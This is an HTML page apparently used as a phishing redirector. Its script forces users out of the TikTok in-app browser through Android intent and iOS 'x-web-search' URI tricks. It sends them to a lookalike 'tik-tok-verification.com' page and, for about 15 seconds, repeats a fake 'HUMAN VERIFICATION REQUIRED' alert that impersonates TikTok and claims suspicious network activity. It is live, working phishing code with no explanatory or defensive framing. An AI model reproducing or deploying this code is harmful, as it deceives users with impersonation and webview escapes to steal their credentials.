<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 15000;

    function forceDefaultBrowser() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: This "Generic Intent" targets the DEFAULT browser, not just Chrome
            window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;end`;
        } else {
            // iOS: Using the 'x-web-search' trick to force the "Open in Safari" prompt
            // This bypasses the TikTok webview by triggering a system-level URI
            window.location.href = "x-web-search://?" + encodeURIComponent(targetUrl);
            
            // Fail-safe: Direct assignment in case the protocol is blocked
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 100);
        }
    }

    function runLock() {
        if (Date.now() > killTime) return;

        // 1. Initial jump attempt
        forceDefaultBrowser();

        // 2. Focus Check (Wait 320ms for OS to respond)
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // 3. RELAY: Firing immediately after OK to use the tap gesture
                forceDefaultBrowser();

                setTimeout(runLock, 320);
            }
        }, 320);
    }

    window.onload = runLock;
    window.onfocus = () => { if (Date.now() < killTime) runLock(); };
</script>

</body>
</html>
